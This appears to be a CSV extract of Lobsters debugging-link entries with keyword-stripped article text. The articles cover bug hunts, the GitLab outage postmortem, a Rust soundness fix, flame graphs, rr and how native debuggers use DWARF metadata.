472,Lobsters,debugging,Debugging,Sleeping beauty - How one of the oldest bugs in EVE got hunted down and resolved,http://community.eveonline.com/news/dev-blogs/sleeping-beauty/,sleeping beauty one oldest bug eve got hunted resolved,began background stackless python pystacklessrunwatchdogex show code eureka moment never assume,sometimes story bug intriguing write technically minded curious reality development eve online join deepdive technical depth eve online code base recount one oldest defect game got hunted resolved â always working improving eve online code base hope enjoy coming along journey work lookhow begana little ago ccp karkur asked could help issue looking drone window sometimes would stop updating drone recalled investigation uncover bug code related drone ui course hour managed repro drone bug time time adding logging problem seemed lie last repro became clear failing least expected line code drone window simply started updating went sleep bit never woke â seemed tasklets occasion simply returning sleepthe original bug quite difficult reproduce ccp karkur put together script generated tasklets simply sleep given time tracking identify tasklets never finish script able reproduce sleeping disorder somewhat reliably script identified tasklet nt wake upon inspection clear tasklet neither scheduled blocked sort limbomy first attempt reproducing bug ccp karkur script successful running jessica authoringdebugging tool without client nt seem luck later tried client better luck seemed simply lot tasklets started reading relevant c code try come theoriessome backgroundtasklets seeâ stackless pythonâ information run pyscheduler run calling pystacklessrunwatchdogex method take timeout value run scheduled tasklets given time passed tasklet created scheduled run pyscheduler run called tasklet sleep call synchro sleepwallclock implemented creating channel calling receive channel block channel somebody sends something channel synchro maintains heap sleeper sleeper simple object hold due time tasklet wake channel synchro tick pull sleeper top heap sends value channel turn unblocks tasklet schedule itmy first idea might bug heap code code old unit test considered writing test even finding suitable replacement realized symptom nt match tasklet never pulled heap case tasklet would simply remain blocked forever still todo list add test code thoughmy next idea came looking documentation ofâ pystacklessrunwatchdogex return tasklet either killed rescheduled turned dead end applies running preemptive mode tasklet interruptedshow codei hunch killing tasklets might factor could nt see anything wrong code around nevertheless could nt convince reference counting channel correct decided clean code bit felt awkward donepyobject synchro sleepwallclock int m const due sleeper sl slchannel pychannelnew null slchannel return pychannelsetpreference slchannel make runnable wakeup sldue due mwallclocksleepersinsert sl go sleep wake sender release channel pyobject ret pychannelreceive slchannel ret killed let try find u queue release resource removesleeper mwallclocksleepers sl return ret sleepwallclock function creates channel store sleeper object put sleeper object heap call receive channel receive call return synchro tick called send channel unblocks causing scheduled tasklet could also killed case receive return nullptr let take look snippet synchro tick gather sleeper wakeup std vector sleeper mwallclocksleeperssize mwallclocksleepersfront due break sleeperspushback mwallclocksleepersshift sleeperssize time nnow beos getactualtime unsigned int sleeperssize sleeper sleeper pychannelgetbalance schannel int re pychannelsend schannel pynone re pyos pyerror pydecref schannel look correct channel could pulled tasklet send call happens tasklet killed void synchro removesleeper heap sleeper sleeper sl sleeperit sleepersbegin sleepersend channel slchannel break sleepersend ok found u let delete u sleepersremove pydecref slchannel look alright tasklet removed heap channel released note error tasklet ca nt found heap could woken scheduled tick killed case channel released ticklet examine bit though keep mind pydecref free memory reference count go zero pychannelnew call sleepwallclock return pychannelobject reference count one reference added channel object deleted tick call pydecref â fine reference channel sleepwallclock receive call except removesleeper called tasklet killed comparing channel object always onetoone correspondence tasklets channel effectively looking tasklet since needed keep track channel wake use channel added reference tasklet sleeper object could verify lo behold running script ccp karkur got discrepancy tasklet determined heap based channel tasklet nt matchthe eureka momentwhen channel object deleted memory free available reuse implies tasklet go sleep tick tasklet killed exactly wanted wake get channel pointer killed tasklet removesleeper case remove wrong tasklet one called sleepwallclock heap kill channel leaving nonscheduled nonblocked statethe fix simple move pydecref call sleepwallclock ensures channel object recycled prematurely opinion actually cleaner keeping reference counting localized one functionnever assumeeve online almost year old seen many battle lifetime one say code base thoroughly battle tested however nt mean sneaky bug might hiding finding bug fundamental function surprising say least guess never assume part code base absolutely correct ccp karkur others spent considerable amount time tracking issue high confidence higher level code allowed go investigation assumption sleep broken stubborn found rare edge casewe reason believe bug symptom underlying issue overview updating example shield armor structure bar updating bug always nearly impossible reproduce nevertheless reported occasionally especially mass test heavy fight tranquility
473,Lobsters,debugging,Debugging,Postmortem of database outage of January 31 - Gitlab,https://about.gitlab.com/2017/02/10/postmortem-of-database-outage-of-january-31/,postmortem database outage january gitlab,database setup timeline pgpoolii infrastructure utc utc removal user spam hard delete utc pgbasebackup utc engineering runbooks broken recovery procedure database backup using pgdump dmarc azure disk snapshot lvm snapshot recovering gitlabcom publication outage publicly visible google document http twittercomgitlabstatus data loss impact impact gitlab gitlabcom database incident http dashboardsgitlabcom root cause analysis why problem gitlabcom database directory removed replication stop database load increase gitlab employee scheduled removal problem restoring gitlabcom take long staging database needed restoring gitlabcom could fail secondary database host could use standard backup procedure backup procedure fail silently email rejected azure disk snapshot enabled backup procedure tested regular basis improving recovery procedure overview status issue listed blog post update across host clearly differentiate host environment prometheus monitoring backup set postgresql maxconnections sane value investigate point time recovery continuous archiving postgresql hourly lvm snapshot production database azure disk snapshot production database move staging arm environment recover production replica automated testing recovering postgresql database backup improve postgresql replication documentationrunbooks investigate pgbarman creating postgresql backup investigate using wale mean database backup realtime replication build streaming database restore assign owner data durability tool executing reverting rail migration staging disaster recovery everything database http dashboardsgitlabcomdashboarddbpostgresqlbackups removal user spam hard delete troubleshooting faq merge request shown open commits already merged default branch resolve merge request yet merged seeing change resolve gitlab page website updated solve pipeline executed commits showing created project utc show issue gone happened,january experienced major service outage one product online service gitlabcom outage caused accidental removal data primary database server incident caused gitlabcom service unavailable many hour also lost production data eventually unable recover specifically lost modification database data project comment user account issue snippet took place utc january best estimate affected roughly project comment new user account code repository wikis hosted gitlabcom unavailable outage affected data loss gitlab enterprise customer githost customer selfhosted gitlab ce user affected outage data loss losing production data unacceptable ensure happen working multiple improvement operation recovery procedure gitlabcom article look went wrong recover prevent happening future gitlabcom user whose data lost people affected outage sorry apologize personally gitlab ceo behalf everyone gitlab database setup gitlabcom currently us single primary single secondary hotstandby mode standby used failover purpose setup single database handle load ideal primary hostname secondary hostname past various issue particular setup due single point failure example timeline january engineer started setting multiple postgresql server staging environment plan try pgpoolii see would reduce load database load balancing query available host issue plan infrastructure utc prior starting work engineer took lvm snapshot production database loaded staging environment necessary ensure staging database date allowing accurate load testing procedure normally happens automatically every hour utc wanted date copy database utc gitlabcom start experiencing increase database load due suspect spam week leading event gitlabcom experiencing similar problem severe one problem load caused many user able post comment issue merge request getting load control took several hour would later find part load caused background job trying remove gitlab employee associated data result account flagged abuse accidentally scheduled removal information regarding particular problem found issue removal user spam hard delete utc due increased load postgresql secondary replication process started lag behind replication failed wal segment needed secondary already removed primary gitlabcom using wal archiving secondary resynchronised manually involves removing existing data directory secondary running pgbasebackup copy database primary secondary one engineer went secondary wiped data directory ran pgbasebackup unfortunately pgbasebackup would hang producing meaningful output despite verbose option set try pgbasebackup mentioned could connect due master enough available replication connection controlled maxwalsenders option resolve engineer decided temporarily increase maxwalsenders default value applying setting postgresql refused restart claiming many semaphore created happen example maxconnections set high case set value way high yet applied almost year ago working fine point resolve setting value reduced resulting postgresql restarting without issue unfortunately resolve problem pgbasebackup starting replication immediately one engineer decided run strace see blocking strace showed pgbasebackup hanging poll call provide meaningful information might explained utc one engineer think perhaps pgbasebackup created file postgresql data directory secondary previous attempt run normally pgbasebackup print error case engineer question nt sure going would later revealed another engineer nt around time normal behaviour pgbasebackup wait primary start sending replication data sit wait silently time unfortunately clearly documented engineering runbooks official pgbasebackup document trying restore replication process engineer proceeds wipe postgresql database directory errantly thinking secondary unfortunately process executed primary instead engineer terminated process second two noticing mistake point around gb data already removed hoping could restore database engineer involved went look database backup asked help slack unfortunately process finding using backup failed completely broken recovery procedure brings u recovery procedure normally event like one able restore database relatively little time using recent backup though form data loss always prevented gitlabcom following procedure place every hour backup generated using pgdump backup uploaded amazon old backup automatically removed time every hour generate lvm snapshot disk storing production database data snapshot loaded staging environment allowing u safely test change without impacting production environment direct access staging database restricted similar production database various server eg nfs server storing git data use azure disk snapshot snapshot taken per hour replication postgresql host primarily used failover purpose disaster recovery point replication process broken data already wiped primary secondary meaning could restore either host database backup using pgdump went look pgdump backup found bucket empty recent backup found anywhere upon closer inspection found backup procedure using pgdump database running postgresql postgres release considered major difference major version result pgdump producing error terminating backup procedure difference result omnibus package work currently support postgresql allowing user upgrade either manually using command provided package determine correct version use omnibus package look postgresql version database cluster determined pgdirpgversion pgdir path data directory postgresql detected omnibus ensures binary use postgresql otherwise default postgresql pgdump procedure executed regular application server database server result postgresql data directory present server thus omnibus default postgresql turn resulted pgdump terminating error notification enabled cronjobs error notification sent email gitlabcom use dmarc unfortunately dmarc enabled cronjob email resulting rejected receiver mean never aware backup failing late azure disk snapshot azure disk snapshot used generate snapshot entire disk snapshot nt make easy restore individual chunk data eg lost user account though possible primary purpose restore entire disk case disk failure azure snapshot belongs storage account storage account turn linked one host storage account limit roughly tb restoring snapshot using host storage account procedure usually completes quickly however using host different storage account procedure take hour day complete example one case took week restore snapshot result try rely system much enabled nfs server snapshot enabled database server assumed backup procedure sufficient enough lvm snapshot lvm snapshot primarily used easily copy data production environment staging environment process working intended produced snapshot really meant used disaster recovery time outage two snapshot available snapshot created staging environment every hour almost hour outage happened snapshot created manually one engineer roughly hour outage generate snapshot following step taken generate snapshot production copy snapshot staging create new disk using snapshot remove webhooks resulting database prevent triggered accident recovering gitlabcom recover gitlabcom decided use lvm snapshot created hour outage option reduce data loss much possible alternative lose almost hour data process would involve following step copy existing staging database production would contain webhooks parallel copy snapshot used set database snapshot might still contain webhooks nt entirely sure set production database using snapshot step set separate database using snapshot step restore webhooks using database set previous step increment database sequence one ca nt reuse id might used outage gradually reenable gitlabcom staging environment using azure classic without premium storage primarily done save cost premium storage quite expensive result disk slow resulting main bottleneck restoration process lvm snapshot stored host taken two option restore data copy lvm snapshot copy postgresql data directory case amount data copy would roughly since copying restoring data directory would easier decided go solution copying data staging production host took around hour disk network disk throttled really low number around way move cheap storage premium performance would get network processor bottleneck bottleneck drive copied able restore database including webhooks state january utc february utc managed restore gitlabcom database without webhooks restoring webhooks done creating separate staging database using lvm snapshot without triggering removal webhooks allowed u generate sql dump table import restored gitlabcom database around utc finished final restoration procedure restoring webhooks confirming everything operating expected publication outage spirit transparency kept track progress note publicly visible google document also streamed recovery procedure youtube peak viewer count around resulting stream live stream youtube several hour stream used give user live update recovery procedure finally used twitter http twittercomgitlabstatus inform might watching stream document question initially private gitlab employee contained name engineer accidentally removed data name added engineer problem public redact name future case engineer may comfortable name published data loss impact database data project issue snippet etc created january utc utc lost git repository wikis removed stored separately hard estimate much data lost exactly estimate lost least project comment roughly user affected user gitlabcom selfhosted instance githost instance affected impact gitlab since gitlab us gitlabcom develop gitlab outage meant harder get work done developer could continue working using local git repository creating issue delayed publish blog post gitlabcom database incident used private gitlab instance normally use privatesensitive workflow eg security release allowed u build deploy new version website gitlabcom unavailable also public monitoring website located http dashboardsgitlabcom unfortunately current setup website able handle load produced user using service outage fortunately internal monitoring system dashboardsgitlabcom based affected root cause analysis analyse root cause problem use technique called why break incident main problem gitlabcom taking long time restore gitlabcom problem gitlabcom hour gitlabcom database directory primary database removed accident instead removing database directory secondary database directory removed database replication stopped requiring secondary resetrebuilt turn requires postgresql data directory empty restoring required manual work automated documented properly replication stop spike database load caused database replication process stop due primary removing wal segment secondary could replicate database load increase caused two event happening time increase spam process trying remove gitlab employee associated data gitlab employee scheduled removal employee reported abuse troll current system used responding abuse report make easy overlook detail reported result employee accidentally scheduled removal problem restoring gitlabcom took hour restoring gitlabcom take long gitlabcom restored using copy staging database hosted slower azure vms different region staging database needed restoring gitlabcom azure disk snapshot enabled database server periodic database backup using pgdump working could fail secondary database host secondary database data wiped part restoring database replication could used disaster recovery could use standard backup procedure standard backup procedure us pgdump perform logical backup database procedure failed silently using postgresql gitlabcom run postgresql backup procedure fail silently notification sent upon failure email rejected indication failure sender automated process mean report error email rejected email rejected receiving mail server due email signed using dmarc azure disk snapshot enabled assumed backup procedure sufficient furthermore restoring snapshot take day backup procedure tested regular basis ownership result nobody responsible testing procedure improving recovery procedure currently working fixing improving various recovery procedure work split across following issue overview status issue listed blog post update across host clearly differentiate host environment prometheus monitoring backup set postgresql maxconnections sane value investigate point time recovery continuous archiving postgresql hourly lvm snapshot production database azure disk snapshot production database move staging arm environment recover production replica automated testing recovering postgresql database backup improve postgresql replication documentationrunbooks investigate pgbarman creating postgresql backup investigate using wale mean database backup realtime replication build streaming database restore assign owner data durability also working setting multiple secondary balancing load amongst host information found main focus improve disaster recovery making obvious host using instead preventing production engineer running certain command example one could alias rm something safer would protect accidentally running rm rf importantdata disk corruption many way lose data ideal environment one make mistake easily quickly recover minimal impact turn requires able perform procedure regular basis make easy test roll back change example process setting procedure allow developer test database migration information found issue tool executing reverting rail migration staging also looking way build better recovery procedure entire gitlabcom infrastructure database ensure ownership procedure issue disaster recovery everything database monitoring wise also started working public backup monitoring dashboard found http dashboardsgitlabcomdashboarddbpostgresqlbackups currently dashboard contains data pgdump backup procedure aim add data time one might notice moment pgdump backup day old perform backup secondary pgdump put quite bit pressure database since process rebuilding secondary pgdump backup procedure suspended time fear however lvm snapshot taken every hour instead per hour enabling azure disk snapshot something still looking finally looking improving abuse reporting response system information regarding found issue removal user spam hard delete think additional measure take prevent incident like please let u know comment troubleshooting faq merge request shown open commits already merged default branch resolve pushing default branch automatically update merge request aware difference source target branch point safely close merge request merge request yet merged seeing change resolve option resolve close mr create new one push new change merge request source branch rebaseamend force push merge request source branch gitlab page website updated solve go project pipeline new pipeline use master branch create pipeline create start new pipeline using master branch result website updated pipeline executed likely database aware solve create new pipeline using right branch run commits showing pushing new commits automatically solve alternatively try force pushing target branch created project utc show issue gone happened project detail stored database meant data lost project created ran procedure restore project based git repository still stored nfs cluster procedure however able restore project basic form without associated data issue merge request
474,Lobsters,debugging,Debugging,50 Bytes of Code That Took 4 GB to Compile,https://randomascii.wordpress.com/2013/08/14/50-bytes-of-code-that-took-4-gb-to-compile/,byte code took gb compile,heap trace uiforetw heap tracing linux variation stackoverflow window suxs update clang explicit design goal like brucedawson,evil thing macro inline assembler trying run weird test whose purpose really relevant managed write program caused visual studio c compiler allocate gb memory die bad program easily fit single column line might noticed except machine gb free time frantic pagingout data needed find gb memory made laptop completely unresponsive couple minute machine gb free good test case memory analysis etw see duplicate result simplified code minimal essence amuses void test asm add eax asm add eax compiler output error illegal number operandserror illegal number operandserror inline assembler syntax error opcode found end file fatal error compiler heap space running window compiler largeaddressaware process running heap space mean allocating gb address space compiles row see spike memory usage one got curious wondered part compiler allocating memory used etwheapbat record heap virtualalloc allocation clexe compiled source file would use uiforetw make sure virtualalloc stack always checked setting dialog record heap trace couple mb allocated heap lot allocated using virtualalloc shown etwheapbat ship uiforetw run elevated command prompt follow instruction use uiforetw virtualalloc call stack uiforetw heap tracing greater detail finish investigation looked call stack see inlineassembler lexer allocating lot asm token using virtualheap virtualheap create reserve address space virtualheap heapextend commits memory drilling bit deeper shown show address space reserved kb chunk committed kb chunk detail quite clear virtualheap heapextend call virtualheap create without source code unknowable stop pas along vc team usual surprised fix exactly critical problem noticed machine gb free first hit problem good thing compiler process else would continued consuming memory beyond gb three cheer artificial limit test done using vc debug build try variation linux variation thematically similar problem linker consuming vast quantity memory simple program described stackoverflow window suxs anticipate people say window horrible operating system laptop locked minute initially happened well maybe allocate write gb ram linux osx machine fail cause serious system slowdown actually prove anything laptop gb ram use possible way get gb memory write lot data disk laptop drive notoriously slow test work machine gb ram gb available laptop fewer program running gb free gb allocated freed le five second reddit discussion found update weird blog post popular people difficultly reproing problem bug confirmed happen v guaranteed happen test function last thing source file clearly critical bug code malformed compiler give warning point problem area nothing truly bad happens however still lexer failure particular outofmemory failure prevents vc reporting brace mismatch add function test lexing completes additional warning displayed giving great error message compiling incorrect code important enough one clang explicit design goal like like loading related brucedawson programmer working google focusing optimization reliability nothing fun making code run fast unless eliminating large number bug also unicycle play ice hockey sled hockey juggle worry whether blog called review tell http
475,Lobsters,debugging,Debugging,"Buggy Software, Loyal Users: Why Bug Reporting is Key To User Retention",https://codewithoutrules.com/2017/02/10/voice-exit-user-retention/,buggy software loyal user bug reporting key user retention,buggy software unhappy user going exit voice loyalty exit voice loyalty better without convince user use voice complain feel heard user going stick around bug reporting improving bug reporting spacemacs responding bug report respond bug report tell user diagnosing bug distributing fix virtuous circle,software bug sorry mine matter much tested much qa tested bug get unless nasa probably afford test software enough anyway mean user finding bug discover site work ie clicked button blank screen came feature promised working know personal experience user enjoy finding bug buggy software unhappy user going luckily economist albert hirschman came answer question exit voice loyalty classic treatise exit voice loyalty hirschman point user unhappy product exactly two option two exiting ie giving product voicing concern someone given software likely tell issue someone care enough file bug le likely switch away software finally loyal user stick around use voice otherwise would choose exit software purpose without user chance want keep leaving though perhaps better without see item thing two choice voice exit convince user use voice complain feel heard user going stick around point might thinking itamar telling obvious thing course user stick around fix bug keep user around keep user around allowing express voice making sure feel heard sometimes may fix bug still satisfied user sometimes may fix bug still fail making feel heard better fixing bug better make user feel heard encounter bug need make sure report bug little effort possible hear back choose fix bug actually figure problem bug report bug fix actually get delivered let go requirement one one bug reporting user notice problem want communicate immediately ensure choose path voice contemplate exiting shiny competitor domain next door faster communication also make much likely bug report useful bug occurred second ago user probably remember happened hour later going hear something flying moose screen maybe hyena remember user human like human hard time remembering thing sometimes forget ensure bug get reported quickly want make easy possible user report problem additional step eg creating account issue tracker mean user dropping reporting process practice many application designed make hard possible report bug visiting website suddenly error occurred please refresh browser course page give indication report problem reoccurs people run website even care problem make sure treating user error occurs improving bug reporting let say include link bug report page let say user jump hoop email verification sign fill field jira bugzilla think really important would like tell u common childhood nightmare following list assume bug reporting easy find easy fill need information user like version program using operating system forth actually need information user want get every additional piece information ask likely make give go away one solution include using rather excellent spacemacs editor usual use new software report bug go anyway report bug spacemacs hit bug reporting key combo get bug reporting page editor filled spacemacs version emacs version configuration made close buffer prepopulates new github issue information hit submit done pretty awesome need find right web page copy every single configuration environmental parameter report bug run errorreporting command also notice lot better automatic crash reporting got participate explain bit important yeah reported crash info let honest really believe anyone look vibe one get certain software much thing commandline tool webbased application every time error occurs user issue eg user ran yourcommand help ask user feedback terminal within context web page file bug report gather much information automatically include bug report user report part care responding bug report next thing actually respond bug report write spacemacs issue filed sitting sad lonely unanswered little annoying understand open source volunteerrun project loyalty come commercial product paying want know problem heard sometimes answer might sorry going fix quarter ok least know stand silence ok respond bug report tell user automated response good enough diagnosing bug decided fix bug proceed figure actual problem diagnosing problem impossible even expensive going fix problem mean user continue affected bug let look common bug report clicked save program crashed deleted day worth hope dream pretty bad unhappy user often case user simply information need figure going even bug report useful often hard reproduce problem testing happens controlled environment make investigation reproduction easier realworld use happens wild good luck reproducing crash remember talked automatically including much information possible bug report right included relevant log time think try ensure log core dump forth always available bug report try automate submitting much possible still giving user ability report specific take problem forget respect user privacy distributing fix diagnosed fixed bug problem solved rather problem almost solved user gotten bug fix work waste time need fast release need automated update possible take long fix reach user practical purpose user heard exception always business user value stability else virtuous circle done right user feel heard choose voice exit get occasional useful bug report allowing improve product user quickly benefit improvement done course many bug caught advance many user never tell problem unless ask good start making user happy loyal even encounter occasional bug
476,Lobsters,debugging,Debugging,Announcing Rust 1.15.1,http://blog.rust-lang.org/2017/02/09/Rust-1.15.1.html,announcing rust,download rust detailed release note stable compiled pic discovered solution stability deliverable rfc rfc contributor thanks,feb rust core team rust team happy announce latest version rust rust system programming language focused safety speed concurrency previous version rust installed getting rust easy rustup update stable nt already download rust appropriate page website check detailed release note github stable release fix two issue soundness bug new vec intoiter asmutslice method regression wherein certain c component rust distribution compiled fpic latter result text section executables writable configuration including common linux configuration subverting important attack mitigation creating longer startup time causing linker work mostlyrust codebases practical impact losing readonly text section relatively small since rust type system first line defense rust linked codebases impact could unexpectedly quite significant pic issue well understood rustspecific rest post focus soundness bug problem asmutslice three line function discovered minute publishing rust reminder peril writing unsafe code asmutslice method intoiter iterator vec type offer mutable view buffer iterated conceptually simple return reference buffer indeed implementation simple unsafe intoiter implemented unsafe pointer buffer pub fn asmutslice self mut unsafe slice fromrawpartsmut selfptr mut selflen simplest unsafe method one could ask spot error reviewer nt api slipped crack standard small one copypaste bug reviewer glossed method take shared reference unsafely derives mutable reference totally bogus mean asmutslice used produce multiple mutable reference buffer one single thing must rust simple example bug would let write incorrectly fn main let v vec let viter vintoiter let mut viterasmutslice let mut viterasmutslice referencing mutable slice also notice iterator created viter declared mutable good indication something fishy going solution trivial change self mut self pub fn asmutslice mut self mut unsafe slice fromrawpartsmut selfptr mut selflen proper uniqueness invariant maintained one mutable slice created time viter must declared mutable order pull mutable slice made change releasing fix rust take pride breaking apis since new minor feature present implementation spectacularly unsound decided go ahead release fix immediately hopefully many codebases pick nt consider breaking change requires careful transition necessary bug fix rust approach ensuring stability see stability deliverable blog post rfc language evolution rfc library evolution still evaluating learn good reminder care must taken writing unsafe code idea catch kind problem earlier development process nt made decision yet apologize inconvenience let go hack contributor individual contribute rust thanks
478,Lobsters,debugging,Debugging,Where has my disk space gone? Flame graphs for file systems,http://www.brendangregg.com/blog/2017-02-05/file-system-flame-graph.html,disk space gone flame graph file system,svg flame graph adjacency diagram inverted icicle layout using git flamegraph without git filespl flamegraphpl linux source example flame graph v tree map v sunburst,laptop recently running low available disk space mystery different tool explore file system including running find l command terminal time consuming use wanted big picture view space directory subdirectory created simple open source tool using flame graph final visualization demonstrate space consumed linux source code click zoom ctrlf search svg new flame graph see flame graph page case width corresponds total size created visualizing stack trace since generic hierarchical visualization technically adjacency diagram inverted icicle layout suited hierarchy directory well also used diagnose similar problem friend laptop turned due backup application consuming space directory completely unknown following section show create one start opening terminal session use command line using git git command fetch flamegraph repository run command git clone http githubcombrendangreggflamegraph cd flamegraph filespl user flamegraphpl hash countnamebytes outsvg open outsvg browser change user directory want visualize could everything provided nt removable storage network file system mounted would include report accident without git nt git download two perl program straight github filespl flamegraphpl either using wget download via browser save step chmod filespl flamegraphpl filespl user flamegraphpl hash countnamebytes outsvg change user directory want visualize open outsvg browser linux source example reference linux source example included created using filespl flamegraphpl hash countnamebytes title linux source tree file size customize flame graph using option flamegraphpl h option h ambiguous hash height help usage flamegraphpl option infile outfilesvg title change title text width width image default height height frame default minwidth omit smaller function default pixel fonttype font type default verdana fontsize font size default countname count type label default sample nametype name type label default function color set color palette choice hot default mem io wakeup chain java j perl red green blue aqua yellow purple orange hash color keyed function name hash cp use consistent palette palettemap reverse generate stackreversed flame graph inverted icicle graph negate switch differential hue bluered help message eg flamegraphpl title flame graph malloc tracetxt graphsvg might need know minwidth option rectangle thinner pixel zoomed elided conserve space svg mean thing missing zoom problem set minwidth update see followon post flame graph v tree map v sunburst
479,Lobsters,debugging,Debugging,rr 4.5.0 Released,http://robert.ocallahan.org/2017/02/rr-450-released.html,rr released,rr regression hardware lock elision kvm bug dynamorio,released rr massive thanks keno fischer probably contributed release anyone else another incremental release rr already pretty good singlecore recording replaying debugging gdb reverse execution incremental nature recent release reflects still significant amount work keep updating rr fix bug cope new kernel hardware feature start getting used application notably release add support intel knight landing kaby lake cpu contains workaround regression caused linux kernel security fix add support recording software using hardware lock elision includes detection kvm bug break hle support release also contains fix enables recording go program encouraging report rr adoption rr user pretty much ceasing use standalone gdb however rr definitely need user hardware o issue crop bigger userbase easier get attention people whose cooperation need happy rr user want help make sure rr nt stop working one day please spread word let say tiny little bit future plan plan keep maintaining rr help keno kyle people community nt plan add major new userfacing functionality rr ie going beyond gdb rather build thing separate project top rr rr stableinpractice c api amenable supporting alternative debugger implementation happy help people build built yet released framework us part dynamorio enable lowoverhead binary instrumentation rr replay plan keep closed least money coming one major improvement expect add rr time year reworking trace storage enable easy trace portability fix existing issue
480,Lobsters,debugging,Debugging,"Stop Filing Bugs, File a Container!",http://blog.runkit.com/2017/02/01/stop-filing-bugs-file-a-container.html,stop filing bug file container,,page moved
481,Lobsters,debugging,Debugging,Time-Travel Debugging for JavaScript/Node.js,https://www.microsoft.com/en-us/research/publication/time-travel-debugging-javascriptnode-js/,timetravel debugging javascriptnodejs,,timetraveling execution history program debugging enables developer precisely track understand sequence statement program value leading error provide functionality real world developer embarked two year journey create production quality timetraveling debugger microsoft opensource chakracore javascript engine popular nodejs application framework
482,Lobsters,debugging,Debugging,"Debugging with the natives, part 2",http://www.cl.cam.ac.uk/~srk31/blog/2017/01/30/#native-debugging-part-2,debugging native part,ramble around computer science mon jan debugging native part piece hardware support operating system mechanism ptrace compiler support debugger debugging happens outside debuggee remains oblivious debugging nt need explicitly enabled language knowledge provide symbolic memory abstraction obliviousness compiler describes work describes mapping source binary level effect codegen metadata besteffort descriptive debugging good debugging optimised code without deoptimising fullspeed debugging control problem joe damato excellent article level abstraction continued devel permanent link contact validate page,ramble around computer science diverting train thought wasting precious time mon jan debugging native part aeon ago wrote piece giving rough outline native debugger like gdb work promised followup look pile technique principled way ca nt really excuse delay anyone still listening go sourcelevel debugging native code supported make four different different level complete stack hardware support cpu memory hardware usually provide primitive either designed explicitly debugging singlestep mode hardware watchpoints etc happen prove useful memory protection illegal instruction etc machinelevel facility obviously know nothing source language operating system mechanism operating system provides processlevel debugging mechanism ptrace call talked last time also know nothing source language provide essential interactive debugging one process another compiler support compiler generated debugged program output additional information help debugger task knowledge source language come system way awareness source language implementation localised compiler rather runtime environment aka operating system tool debugger debugger client feature also embodies knowledge one source language unfortunately sometimes specific implementation fact contains partial often extensive implementation source often used printing expression also conditional breakpoints watchpoints etc unfortunately also usefully implementation nt share much code compiler interpreter rather compiler interpreter peculiar kind back onto running process image containing thirdparty implementation debugged language say implementation work must cooperate generate significant code take decision language compiled worth meditating second odd also mean debugger effectively expose view running process state source language even switch language say jump c view pascal view whatever process state split four two pair first two implement machinelevel primitive upward mapping virtualisation operating system process abstraction second two implement sourcelevel view programmer usually prefers mapping upwards binary sourcelevel let take machinelevel pair begin operating system point view debugging support designed around following principle perhaps nt say designed since reality grew became principle later debugging happens outside debuggee remains oblivious debuggee includes runtime support debugging nt even know happening debugger depend generic service operating system functionality specific program debugging nt need explicitly enabled debugger may attach process without cooperation process nt true earliest version unix fixed time pi eighth edition language knowledge machine oslevel debugging infrastructure knowledge source language syntax semantics knowledge source language left compiler implemented source language lesser extent debugger provide symbolic memory abstraction oslevel infrastructure abstract little machine level providing symbolic view process structure roughly assembler level abstraction symbol information specified operating system object file format may may present executed binary debugger find binary opposed raw process image make use surprisingly strong property result design firstly debugging done remote process perhaps separate machine debuggee perhaps even machine different architecture secondly debugging done postmortem thirdly infrastructure work many source trivially far since seen get assemblylevel view contrast language virtual machine think jvm implement debugging using invm debug server work across network nt support postmortem debugging typically bake concept source language enough machinelevel part go machine assemblylevel debugging sourcelevel debugging need help compiler designed around following principle obliviousness debugger know nothing compiler compiler need present whenwhere debugger run api debugger compiler api debugger debuggee api debugger o namely ptrace seen already compiler debugger however interface another kind compiler describes work compiler job output whatever information debugger might need debug program compilerindependent form metadata aka debugging information packaged within alongside output binary g option c compiler turning distinct symbolic assemblylevel metadata object file format prescribes always output optionally removed strip although debugging information sometimes stored section object file symbol stab nowadays generally nt calling symbol therefore although still common bit outdated confusing metadata describes mapping source binary level direction given sourcelevel entity one look fact implemented binary register currently hold given local variable also mapping direction given program counter value say one look subprogram function method instruction location modern source language modern compiler metadata necessity extremely expressive extremely detailed available mapping nt quite cover every conceivable requirement bit biased typical debugger feature example dwarf make fairly easy map source variable machine location required evaluate command like print x hard inverse mapping machine location would required debugger let user ask register rax right fully bidirectional mapping would pretty useful many debugging something worked little plan work effect codegen whether compiler generates debugging information typically effect code generated debug build nt run slower build true even debugger attached except overhead operating system mechanism tend low lengthen path system call signal handling mainline execution program metadata besteffort practice compiler commit faithfully describing implementation decision took compilation consequently debugger might sometimes unable recover sourcelevel view program example might fail find particular local variable know many instruction need step reach next source line happen metadata generated compiler incomplete absent let concrete runthrough work far fairly generic let fix gnulinux modern elfbased system pretty familiar architecture specific metadata format dwarf compile program g mean please generate metadata first let try without cc hello helloc readelf hello grep debug output debugging section still debug program assembly level o debugging mechanism remain available compilergenerated assembly code wrote manually set breakpoints watchpoints single step gdb q args hello reading symbol hello debugging symbol found done gdb break main breakpoint gdb run starting program tmphello breakpoint main gdb disa dump assembler code function main push rbp mov rsp rbp mov edi callq put plt mov eax pop rbp retq let compile debug information cc g hello helloc readelf hello grep debug debugaranges progbits debuginfo progbits debugabbrev progbits debugline progbits debugframe progbits debugstr progbits debug section three main kind information firstly file line number debugline encode mapping object code address source coordinate file line column dump fairly readably follows readelf wl hello decoded dump debug content section debugline cu helloc file name line number starting address helloc helloc helloc helloc secondly frame information often come section called ehframe cheated bit get exactly current gcc add switch tell debugger walk stack walking stack mean roughly mean getting sequence stack pointer paired program counter value call site active callchain old stack pointer program counter always saved somewhere otherwise could nt return call walk stack start current live register file given use ptrace hold end stack pointer program counter dwarf describes rewind register value andor register whose job record callchain rbp calleesaves often included back state previous call site chain description unwinding logically table see main function cell expression describing compute caller value register rbp value frame pointer also caller program counter ie return address given ra computation factored two firstly calculate canonical frame address current frame register value see cfa column fixed offset rsp rbp actually fixed address stack expression change instruction instruction stack pointer get adjusted secondly obtain saved value want reading stack fixed offset address mean byte factoring help compactness cfarelative offset nt change stack pointer move cfa column need describe however although stored offset cfa cover lot case sometimes complex computation required usually appear dwarf bytecode expression readelf wf hello snip fde loc cfa rbp ra u snip debuginfo section biggie describes structural detail source program along source binary dimension list source file also list compilation unit latter structure describes functionsmethods data type languageimplementation decision compiler took generating binary code data type laid register stack slot hold local variable lifetime although shown much simple case shown address program variable described turingpowerful stack machine language essentially bytecode dwopcallframecfa one operation simply say push address frame base recorded frame info treelike structure information also describes detailed static structure code including function inlining inmemory location corresponding particular lexical block code worth asking whether dwarf info might usefully bundle source code never seen done would make lot sense readelf wi hello content debuginfo section compilation unit offset length version abbrev offset pointer size b abbrev number dwtagcompileunit c dwatproducer indirect string offset gnu c mtunegeneric g fstackprotectorstrong dwatlanguage ansi c 